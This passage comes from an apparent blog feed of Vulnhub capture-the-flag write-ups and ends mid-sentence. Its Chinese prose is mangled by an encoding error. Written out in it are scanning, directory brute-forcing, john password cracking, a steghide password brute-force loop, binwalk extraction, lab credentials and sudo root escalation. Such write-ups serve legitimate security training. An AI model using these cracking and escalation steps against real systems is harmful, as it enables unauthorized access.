<p>è¯¥é¶æœºçš„æƒé™æå‡æ˜¯æœ€ç®€å•çš„ã€‚</p>
<p>é¦–å…ˆè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå‘ç°åœ¨å®¶ç›®å½•ä¸‹æœ‰ä¸€ä¸ªæ–‡ä»¶<code>user.txt</code>ï¼Œä¸€çœ‹å°±çŸ¥é“æ˜¯flagï¼›ä»¥åŠä¸€ä¸ªç›®å½•<code>yousef</code>ã€‚æŸ¥çœ‹<code>/etc/passwd</code>å‘ç°ç¡®å®æœ‰è¿™ä¹ˆä¸€ä¸ªç”¨æˆ·ã€‚</p>
<p>æˆ‘ä»¬å…ˆå°è¯•è¯»å–<code>user.txt</code>çš„ä¿¡æ¯ï¼Œå‘ç°èƒ½å¤Ÿç›´æ¥è¯»å–ï¼ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=</span><br></pre></td></tr></table></figure></p>
<p>è¿™çœ‹è¿‡å»æœ‰ç‚¹åƒbase64ç¼–ç çš„ç»“æœã€‚å› æ­¤å°è¯•è§£ç ã€‚</p>
<blockquote>
<p>base64ç¼–ç å¾—åˆ°çš„å­—ç¬¦ä¸²åŒ…å«a-zA-Z0-9/+=ï¼Œæœ€æ˜¾è‘—çš„ç‰¹å¾å°±æ˜¯ç»“æœæœ‰ä¸€ä¸ªæˆ–å¤šä¸ª=ã€‚</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150426.png" /></p>
<p>å‘ç°å±…ç„¶ç›´æ¥å°±å¾—åˆ°<code>yousef</code>å¾—è´¦å·å’Œå¯†ç ï¼ç›´æ¥<code>su</code>åˆ‡æ¢ï¼ˆéœ€è¦è¿›è¡Œshellå‡çº§ï¼‰ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€‰æ‹©ç”¨<code>ssh</code>è¿æ¥</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150759.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150809.png" /></p>
<p>æŸ¥çœ‹ä»¥ä¸‹è¯¥ç”¨æˆ·å¾—sudoæƒé™ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150849.png" /></p>
<p>å‘ç°è¯¥ç”¨æˆ·å±…ç„¶æœ‰å…¨éƒ¨å¾—æƒé™ã€‚å› æ­¤ç›´æ¥ç”¨sudoæƒé™æ‰§è¡Œshellå³å¯ã€‚ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409151011.png" /></p>
<p>ææƒæˆåŠŸï¼ç›´æ¥è¯»å–<code>/root</code>ä¸‹çš„flagå³å¯ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bat /root/root.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># WW91J3ZlIGdvdCB0aGUgcm9vdCBDb25ncmF0dWxhdGlvbnMgYW55IGZlZWRiYWNrIGNvbnRlbnQgbWUgdHdpdHRlciBAeTB1c2VmXzEx</span></span><br></pre></td></tr></table></figure></p>
<p>è¯¥é¶æœºåˆ°æ­¤ç»“æŸã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>è¯¥é¶æœºè™½ç„¶éš¾åº¦ä¸ºç®€å•ï¼Œè¿™æ˜¯å› ä¸ºè¯¥é¶æœºçš„æ¼æ´åœ¨ç°å®ä¸­æ¯”è¾ƒå¸¸è§ï¼Œå¤§å®¶è§çš„å¤šäº†ï¼Œè‡ªç„¶å°±ç®€å•äº†ã€‚æ¢å¥è¯è¯´ï¼Œç®€å•çš„é¶æœºæ›´è´´è¿‘ç°å®ã€‚</p>
<p>é€šè¿‡å¯¹è¯¥é¶æœºçš„æ¸—é€ï¼Œè¿˜æ˜¯å­¦åˆ°äº†ä¸€äº›çŸ¥è¯†ï¼š</p>
<ol type="1">
<li>æŒ‡çº¹æ¢æµ‹</li>
<li>403 Bypass</li>
</ol>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
        <tag>æŒ‡çº¹æ¢æµ‹</tag>
        <tag>403 Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>9 Vulnhub Vikings1 Writeup</title>
    <url>/2022/04/10/9%20Vulnhub%20Vikings1%20Writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦ä¸ºç®€å•æˆ–è€…ä¸­ç­‰ï¼Œæœ€åçš„RPCææƒè¦ææ‡‚è¿˜æ˜¯åºŸäº†ç‚¹æ—¶é—´ã€‚</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/vikings-1,741/">Vikings</a></p>
<p>éš¾åº¦ï¼šä½ï¼ˆä¸­ï¼‰ï¼ŒCTFé£æ ¼</p>
<p>ç›®æ ‡ï¼šå–å¾—rootæƒé™ + 2 Flag</p>
<p>æ¶‰åŠæ”»å‡»æ–¹æ³•ï¼š</p>
<ul>
<li>ä¸»æœºå‘ç°</li>
<li>ç«¯å£æ‰«æ</li>
<li>Webä¿¡æ¯æ”¶é›†</li>
<li>ç¼–ç è½¬åŒ–/æ–‡ä»¶è¿˜åŸ</li>
<li>ç¦»çº¿å¯†ç ç ´è§£</li>
<li>éšå†™æœ¯</li>
<li><strong>äºŒè¿›åˆ¶æ–‡ä»¶æå–</strong></li>
<li><strong>ç´ æ•°æŸ¥æ‰¾/ç§‘æ‹‰èŒ¨çŒœæƒ³</strong></li>
<li><strong>RPCæ¼æ´ææƒ</strong></li>
</ul>
<h1 id="æ¸—é€">æ¸—é€</h1>
<p>æ”»å‡»ä¸»æœºï¼ˆkaliï¼‰ï¼š10.0.2.4</p>
<h2 id="ä¸»æœºå‘ç°ç«¯å£æ‰«æç«¯å£æœåŠ¡å‘ç°">ä¸»æœºå‘ç°ã€ç«¯å£æ‰«æã€ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.12</span><br><span class="line">sudo nmap -p22,80 -sV -sC 10.0.2.12</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410164330.png" /></p>
<ul>
<li>22ç«¯å£ä¸Šçš„æœåŠ¡æ˜¯ssh</li>
<li>80ç«¯å£ä¸Šçš„æœåŠ¡æ˜¯httpï¼Œapache2.4.29</li>
<li>é¶æœºçš„OSä¸ºUbuntu</li>
<li>é¶æœºçš„ç½‘ç«™ä¸Šæœ‰ä¸€ä¸ªæ–‡ä»¶<code>/site/</code></li>
</ul>
<h2 id="è®¿é—®httpæœåŠ¡">è®¿é—®httpæœåŠ¡</h2>
<p>è®¿é—®é¡µé¢å‘ç°éœ€è¦åŠ è½½å¾ˆé•¿çš„æ—¶é—´ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ã€‚æŸ¥çœ‹æºç å‘ç°æ˜¯è¯¥é¡µé¢åŠ è½½äº†ä¸€äº›å¤–ç½‘çš„èµ„æºï¼Œå¯¼è‡´åŠ è½½é€Ÿåº¦æ…¢ã€‚å‘ç°æºç æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚</p>
<p>æŸ¥çœ‹é¡µé¢å†…å®¹ï¼Œè®²è¿°çš„æ˜¯ç»´äº¬äººçš„æ•…äº‹ï¼Œ<em>é¢†å¯¼è€…ä¸ºäº†æŠ¥æ€çˆ¶ä¹‹ä»‡ä»è€Œè¿›è¡Œäº†ä¸€åœºä¾µç•¥ï¼Œä»–çš„çˆ¶äº²æ˜¯Ragnar</em>ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯äº†ï¼Œä¸‹é¢çš„åŠŸèƒ½ç‚¹éƒ½æ˜¯å‡çš„ã€‚</p>
<p>æ¥ä¸‹æ¥è¿›è¡Œè·¯å¾„æ‰«æ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.12 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br><span class="line"></span><br><span class="line">gobuster dir -u http://10.0.2.12/site/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
<p>åè€…æ‰«æåˆ°äº†äº†ä¸€ä¸ªæ–‡ä»¶<code>war.txt</code>ï¼Œè€Œè¯¥ç½‘ç«™ä¸»é¡µé¢ä¹Ÿæè¿°çš„æ˜¯æˆ˜äº‰ï¼Œå› æ­¤è¿™ä¸ªæ–‡ä»¶å€¼å¾—çœ‹ã€‚è€Œå…¶ä»–çš„æ–‡ä»¶éƒ½æ˜¯<code>images, css, js, index.hmtl</code>è¿™äº›æ²¡æœ‰ä»€ä¹ˆå®è´¨ä¿¡æ¯ã€‚</p>
<p>ç›´æ¥è®¿é—®<code>war.txt</code>ï¼Œå†…å®¹æ˜¯<code>/war-is-over</code>ï¼Œè¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªurlè·¯å¾„ï¼Œç›´æ¥è®¿é—®ï¼Œå¾—åˆ°ä¸€å¤§ä¸²å­—ç¬¦ï¼Œç²—ç•¥ä¸€çœ‹ï¼Œå‘ç°å¯èƒ½æ˜¯ç»è¿‡base64åŠ å¯†çš„å†…å®¹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410172535.png" /></p>
<p>ä¹ä¸€çœ‹è§£ç å®Œåè€Œæ›´åŠ çš„éš¾ç†è§£äº†ï¼Œä½†æ˜¯ä»”ç»†çœ‹æœ€å¼€å§‹çš„PKã€‚æ¯ç§æ ¼å¼çš„æ–‡ä»¶å¤´éƒ¨ä¿¡æ¯éƒ½ä¸åŒï¼Œè€Œzipçš„æ–‡ä»¶çš„å¤´éƒ¨ä¿¡æ¯æ˜¯<code>504B0304</code>ï¼Œè½¬ä¸ºå­—ç¬¦å³ä¸ºPKå¼€å¤´ã€‚</p>
<p><a href="https://blog.csdn.net/Liukairui/article/details/105662668?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1.pc_relevant_default&amp;spm=1001.2101.3001.4242.2&amp;utm_relevant_index=4">ä¸åŒæ ¼å¼æ–‡ä»¶å¤´éƒ¨ä¿¡æ¯</a></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410172702.png" /></p>
<p>å› æ­¤ï¼Œåˆæ­¥è®¤å®šè¯¥æ•°æ®æ˜¯ç»è¿‡äº†å‹ç¼©ä¹‹åçš„æ•°æ®ï¼Œå¹¶ä¸”å‹ç¼©æ–¹å¼å¯èƒ½æ˜¯zipã€‚ä¹Ÿå¯ä»¥åˆ©ç”¨cyberchefçš„entroæ¨¡å—ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410173101.png" /></p>
<p>ä¹Ÿè¯´æ˜äº†è¿™å¾ˆæœ‰å¯èƒ½å°±æ˜¯å‹ç¼©åçš„æ•°æ®ï¼Œç„¶åä½¿ç”¨<code>detect file type</code>æ¨¡å—åˆ†æä¸€ä¸‹å…·ä½“çš„æ ¼å¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410173826.png" /></p>
<p>å› æ­¤ç›´æ¥å°†è¿™ä¸²æ•°æ®ä¿å­˜ä¸ºzipæ–‡ä»¶ã€‚ç„¶åè§£å‹ï¼Œå‘ç°éœ€è¦å¯†ç ã€‚ç›´æ¥åˆ©ç”¨<code>john</code>çˆ†ç ´ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410173301.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip2john a.zip &gt; <span class="built_in">hash</span></span><br><span class="line">john <span class="built_in">hash</span> --wordlist=rockyou.txt</span><br></pre></td></tr></table></figure>
<p>ç ´è§£å¾—åˆ°å¯†ç ä¸º<code>ragnarok123</code>ã€‚ç›´æ¥è§£å‹å¾—åˆ°ä¸€å¼ å›¾ç‰‡<code>king</code>ã€‚ç‚¹å¼€å‘ç°å›¾ç‰‡æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œé‚£æœ‰æ²¡æœ‰å¯èƒ½ä¿¡æ¯è¢«è—èµ·æ¥äº†ï¼Œè¿™æ˜¯CTFä¸­å¸¸è€ƒçš„â€œéšå†™æœ¯â€ã€‚</p>
<h2 id="éšå†™æœ¯">éšå†™æœ¯</h2>
<p>éšå†™æœ¯æ¢æµ‹åŠæ•°æ®æå– <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">steghide info [filename]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(cat <span class="string">&quot;rockyou.txt&quot;</span>); <span class="keyword">do</span> steghide extract [filename] -p <span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line"><span class="comment"># ç ´è§£ä¸€ä¸ªå°æ—¶éƒ½ç ´è§£ä¸å‡ºæ¥</span></span><br></pre></td></tr></table></figure></p>
<p>ç›´æ¥æå–äºŒè¿›åˆ¶æ–‡ä»¶çš„ä¿¡æ¯ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -B filename # åˆ†æ</span><br><span class="line">binwalk -e filename # ææƒ</span><br></pre></td></tr></table></figure></p>
<p>éšå†™æœ¯æ¢æµ‹ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">steghide info king</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410174008.png" /></p>
<p>å‘ç°è¿˜éœ€è¦å¯†ç ã€‚æ­¤æ—¶æœ‰ä¸¤ä¸ªé€‰æ‹©</p>
<ol type="1">
<li>æš´åŠ›ç ´è§£å¯†ç </li>
<li>ç›´æ¥æå–äºŒè¿›åˆ¶æ–‡ä»¶çš„ä¿¡æ¯</li>
</ol>
<p>æš´åŠ›ç ´è§£å¯ä»¥ç”¨å¦‚ä¸‹ä»£ç ï¼ˆæ—¶é—´é•¿ï¼Œè¿˜ä¸ä¸€å®šèƒ½å¾—åˆ°ç»“æœï¼‰ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(cat <span class="string">&quot;rockyou.txt&quot;</span>); <span class="keyword">do</span> steghide extract [filename] -p <span class="variable">$i</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
<p>è¿™é‡Œé‡‡ç”¨ç¬¬äºŒç§åŠæ³• <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk -B filename <span class="comment"># åˆ†æ</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410174214.png" /></p>
<p>æ³¨æ„ç¬¬ä¸‰è¡Œï¼Œå­˜åœ¨è¢«å‹ç¼©çš„æ•°æ®ï¼Œæ ¼å¼ã€å¤§å°ã€æ–‡ä»¶åéƒ½åˆ†æå‡ºæ¥äº†ã€‚è¾“å…¥ä¸‹è¿°å‘½ä»¤ï¼Œæå–<code>king</code>ä¸­çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹<code>_king.extracted</code>ï¼Œé‡Œé¢æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯<code>zip</code>ä¸€ä¸ªæ˜¯è§£å‹åçš„æ–‡ä»¶<code>user</code> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk -e filename <span class="comment"># æå–</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410174641.png" /></p>
<p>ç›´æ¥è¯»å–<code>use</code>ä¸­çš„ä¿¡æ¯ï¼Œè·å¾—å¦‚ä¸‹ä¿¡æ¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//FamousBoatbuilder_floki@vikings    # ä¼Ÿå¤§çš„é€ èˆ¹å®¶ floki                                 </span><br><span class="line">//f@m0usboatbuilde7</span><br></pre></td></tr></table></figure></p>
<p>è¿™ä¸¤è¡Œä¿¡æ¯ç‰¹åˆ«æƒ³ç™»å½•<code>ssh</code>çš„æ—¶å€™è¾“å…¥çš„å‘½ä»¤ã€‚å› æ­¤ï¼Œç”¨å„ç§ç»„åˆå°è¯•ä¸€ä¸‹ç™»å½•ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: FamousBoatbuilder_floki</span><br><span class="line">passwoed: f@m0usboatbuilde7</span><br><span class="line"></span><br><span class="line">username: floki</span><br><span class="line">passwoed: f@m0usboatbuilde7</span><br><span class="line"></span><br><span class="line">username: FamousBoatbuilder</span><br><span class="line">passwoed: f@m0usboatbuilde7</span><br><span class="line"></span><br><span class="line">username: floki</span><br><span class="line">passwoed: fFamousBoatbuilder</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>ç›´æ¥ä½¿ç”¨ç¬¬äºŒç»„ç™»å½•æˆåŠŸï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410175037.png" /></p>
<h2 id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</h2>
<p>å…ˆå°è¯•äº†ä¸€ä¸‹<code>sudo -l</code>å‘ç°æ²¡æœ‰ä»»ä½•æƒé™ã€‚åˆå°è¯•äº†ä¸€ä¸‹<code>cat /etc/passwd</code>ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªç”¨æˆ·<code>ragnar</code>ï¼Œè¿™ä¸ªå•è¯ä¸€ç›´å‡ºç°ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬ä¸‹ä¸€æ­¥éœ€è¦ææƒä¸º<code>ragnar</code>ã€‚</p>
<p>æŸ¥çœ‹äº†ä¸€ä¸‹<code>/etc/ragnar</code>ä¸‹ï¼Œå‘ç°æœ‰ä¸€ä¸ª<code>user.txt</code>æ–‡ä»¶ï¼Œè¿™åº”è¯¥å°±æ˜¯flagæ–‡ä»¶ã€‚è¯»å–å…¶ä¸­çš„å†…å®¹ï¼Œå¾—åˆ°ç¬¬ä¸€ä¸ªflag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4bf930187d0149a9e4374a4e823f867d</span><br></pre></td></tr></table></figure></p>
<p>æŸ¥çœ‹äº†ä¸€ä¸‹å½“å‰ç›®å½•ä¸‹æœ‰ä»€ä¹ˆæ–‡ä»¶</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410175315.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readme.txtä¸­çš„å†…å®¹ï¼š</span><br><span class="line">___________________Floki-Creation_________________________</span><br><span class="line"></span><br><span class="line">I am the famous boat builder Floki. We raided Paris this with our all might yet we failed. We don&#x27;t know where Ragnar is after the war. He is in so grief right now. I want to apologise to him.</span><br><span class="line">Because it was I who was leading all the Vikings. I need to find him. He can be anywhere. </span><br><span class="line">I need to create this `boat` to find Ragnar</span><br></pre></td></tr></table></figure>
<p>æ„æ€å°±æ˜¯<em>ä»–æ˜¯ä¸€ä¸ªä¼Ÿå¤§çš„é€ èˆ¹å®¶ï¼Œç»´äº¬äººæŒ‘èµ·äº†ä¸å·´é»çš„æˆ˜äº‰ï¼Œä½†æ˜¯ç»“æœå¤±è´¥äº†ï¼Œå¹¶ä¸”Ragnarä¹Ÿå¤±è¸ªäº†ï¼Œä»–å¾ˆè‡ªè´£ï¼Œæƒ³è¦æ‰¾å›Ragnarï¼Œä»–éœ€è¦åˆ›é€  <strong>boat</strong>å»æ‰¾Ragnar</em>ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">boatä¸­çš„å†…å®¹ï¼š</span><br><span class="line">#Printable chars are your ally.</span><br><span class="line">#num = 29th prime-number.</span><br><span class="line">collatz-conjecture(num)</span><br></pre></td></tr></table></figure>
<p>æ³¨é‡Šä¸º<em>å¯æ‰“å°çš„å­—ç¬¦æ˜¯ä½ çš„ç›Ÿå‹</em>ã€‚ä¸‹é¢ä¸¤è¡Œæ˜¯ä¸€ä¸ªä¼ªä»£ç ï¼Œæ„æ€æ˜¯å…ˆæ‰¾åˆ°ç¬¬29ä¸ªè´¨æ•°ï¼Œç„¶åå¸¦å…¥<code>collatz-conjecture</code>å‡½æ•°ã€‚ç»è¿‡æœç´¢å‘ç°ï¼Œè¿™æ˜¯ä¸€ä¸ªæ•°å­¦çŒœæƒ³ã€‚</p>
<blockquote>
<p><strong>å†°é›¹çŒœæƒ³</strong>ï¼šä¸€ä¸ªæ­£æ•´æ•°xï¼Œå¦‚æœæ˜¯å¥‡æ•°å°±ä¹˜ä»¥3å†åŠ 1ï¼Œå¦‚æœæ˜¯å¶æ•°å°±é™¤ä»¥2ï¼Œè¿™æ ·ç»è¿‡è‹¥å¹²ä¸ªæ¬¡æ•°ï¼Œæœ€ç»ˆå›åˆ°1ã€‚</p>
</blockquote>
<p>æ¨æµ‹ï¼šè¯¥çŒœæƒ³çš„è¿‡ç¨‹ä¸­æ¯ä¸€æ­¥éƒ½ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„æ•°ï¼Œç›´åˆ°ä¸º1ã€‚ç„¶åæ•°å­—å¯ä»¥è®¤ä¸ºæ˜¯å­—ç¬¦çš„asciiç ã€‚å› æ­¤æˆ‘ä»¬ï¼š</p>
<ol type="1">
<li>æ‰¾åˆ°ç¬¬29ä¸ªè´¨æ•°ï¼›</li>
<li>é€šè¿‡å†°é›¹çŒœæƒ³ï¼Œæ‰¾å‡ºæ¯ä¸€æ­¥çš„ç»“æœï¼›</li>
<li>å°†ç»“æœè½¬ä¸ºå­—ç¬¦</li>
<li>æ‰¾å‡ºå…¶ä¸­çš„<strong>å¯æ‰“å°å­—ç¬¦</strong></li>
</ol>
<blockquote>
<p>åŸºæœ¬çš„ ASCIIÂ å­—ç¬¦é›†å…±æœ‰ 128 ä¸ªå­—ç¬¦ï¼Œå…¶ä¸­æœ‰ 95 ä¸ªå¯æ‰“å°å­—ç¬¦ï¼ŒåŒ…æ‹¬å¸¸ç”¨çš„å­—æ¯ã€æ•°å­—ã€æ ‡ç‚¹ç¬¦å·ç­‰ï¼Œå¦å¤–è¿˜æœ‰ 33 ä¸ªæ§åˆ¶å­—ç¬¦ã€‚ åœ¨ASCIIç ä¸­ï¼Œ<strong>ç¬¬0ï½31å·åŠç¬¬127å·(å…±33ä¸ª)ï¼Œæ¢å¥è¯è¯´å°±æ˜¯å°äº32çš„</strong>éƒ½æ˜¯æ§åˆ¶å­—ç¬¦æˆ–é€šè®¯ä¸“ç”¨å­—ç¬¦ã€‚<strong>ç¬¬32~126å·(å…±95ä¸ª)æ˜¯å¯æ‰“å°å­—ç¬¦</strong>ï¼Œä¹Ÿå°±æ˜¯åœ¨æ˜¾ç¤ºå™¨ä¸Šè¾“å‡ºèƒ½å¤Ÿçœ‹å¾—è§çš„ã€‚</p>
</blockquote>
<h2 id="ç´ æ•°æŸ¥æ‰¾å†°é›¹çŒœæƒ³">ç´ æ•°æŸ¥æ‰¾/å†°é›¹çŒœæƒ³</h2>
<p>æ ¹æ®ä¸Šé¢æè¿°ï¼Œç¼–å†™å¦‚ä¸‹è„šæœ¬ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primeNumber</span>():</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> count():</span><br><span class="line">        <span class="keyword">if</span> x &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        NotPrime = <span class="number">0</span></span><br><span class="line">        h = x // <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, h):</span><br><span class="line">            <span class="keyword">if</span> x % i == <span class="number">0</span>:</span><br><span class="line">                NotPrime = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> NotPrime:</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(n) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(x))</span><br><span class="line">            <span class="keyword">if</span> n == <span class="number">29</span>:</span><br><span class="line">                <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collatz</span>(<span class="params">num</span>):</span></span><br><span class="line">    passwd = <span class="built_in">chr</span>(num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> num != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            num = num // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = <span class="number">3</span> * num + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="number">32</span> &lt;= num &lt;= <span class="number">126</span>:</span><br><span class="line">            passwd += <span class="built_in">chr</span>(num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> passwd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(collatz(primeNumber()))</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>è¿è¡Œå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410203036.png" /></p>
<p>æœ€åä¸€è¡Œå°±æ˜¯å…¨éƒ¨å¯æ‰“å°çš„å­—ç¬¦ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mR)|&gt;^/Gky[gz=\.F#j5P(</span><br></pre></td></tr></table></figure></p>
<h2 id="æœ¬åœ°ææƒrpcææƒ">æœ¬åœ°ææƒâ€”â€”RPCææƒ</h2>
<p>å°è¯•ä½¿ç”¨åˆšåˆšå¾—åˆ°çš„å­—ç¬¦ç™»å½•<code>ragnar</code>è´¦å·</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410203119.png" /></p>
<p>æˆåŠŸç™»å½•ã€‚å¦‚æœä½¿ç”¨<code>ssh</code>è¿æ¥ï¼Œåˆ™ä¼šå‡ºç°è¿™æ ·çš„æƒ…å†µï¼Œå†æ¬¡è®©æˆ‘ä»¬è¾“å…¥å¯†ç ã€‚å¥‡æ€ªçš„æ˜¯ä¸ºä»€ä¹ˆåˆšåˆšç™»å½•å´è¿˜éœ€è¦å†æ¬¡è¾“å…¥å¯†ç ï¼Ÿ</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410203550.png" /></p>
<p>è¾“å…¥å¯†ç åæç¤º<code>ragnar is not in the sudoers file.  This incident will be reported.</code>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ²¡æœ‰æ‰§è¡Œ<code>sudo</code>çš„æƒé™ã€‚</p>
<blockquote>
<p><code>/bin/sh</code>è½¬ä¸º<code>/bin/bash</code>å‘½ä»¤ï¼š<code>/bin/bash</code></p>
</blockquote>
<p>ç»¼ä¸Šåˆ†æï¼Œä¸€å®šæ˜¯æ‰§è¡Œäº†<code>sudo command</code>ï¼Œæ‰€ä»¥æ‰éœ€è¦è¾“å…¥å¯†ç ï¼Œä½†æ˜¯æˆ‘ä»¬åªæ˜¯åˆšåˆšç™»å½•ï¼Œæ‰€ä»¥ä¸€å®šæ˜¯ç™»å½•è‡ªå¯åŠ¨ï¼å½“å‘½ä»¤å­˜å‚¨åœ¨ç”¨æˆ·é…ç½®æ–‡ä»¶ä¸­æ—¶ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚ï¼ˆè¿™åº”è¯¥æ˜¯ä½œè€…ç»™çš„æç¤ºï¼Œå¦‚æœç›´æ¥<code>su ragnar</code>åˆ™ä¸ä¼šæœ‰è¿™æç¤ºï¼‰æ¥ä¸‹æ¥å°±å»æ‰¾è‡ªå¯åŠ¨çš„é…ç½®æ–‡ä»¶ï¼Œä¸€èˆ¬æœ‰ï¼š</p>
<blockquote>
<p>é’ˆå¯¹ç”¨æˆ·ï¼š<code>/home/username/.bashrc, /home/username/.profile</code>ç­‰ å…¨å±€ï¼š<code>/etc/profile</code></p>
</blockquote>
<p>æœ€åå†<code>/etc/ragnar/.profile</code>ä¸­å‘ç°</p>
